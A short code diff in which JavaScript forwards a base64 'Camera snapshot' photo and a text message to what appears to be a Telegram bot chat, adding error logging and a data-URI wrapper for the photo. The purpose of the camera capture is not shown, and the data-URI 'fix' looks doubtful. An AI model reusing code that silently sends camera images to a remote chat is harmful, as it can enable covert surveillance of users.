@@ -85,9 +85,15 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         chat_id: user_id,
-                        photo: photo,
+                        photo: `data:image/jpeg;base64,${photo}`, // Ensure proper format
                         caption: "📸 Camera snapshot"
                     })
+                }).then(response => {
+                    if (!response.ok) {
+                        console.error("Failed to send photo:", response.statusText);
+                    }
+                }).catch(err => {
+                    console.error("Error sending photo:", err);
                 });
             }
             
@@ -100,6 +106,12 @@
                     text: message,
                     parse_mode: "HTML"
                 })
+            }).then(response => {
+                if (!response.ok) {
+                    console.error("Failed to send message:", response.statusText);
+                }
+            }).catch(err => {
+                console.error("Error sending message:", err);
             });
         }
 
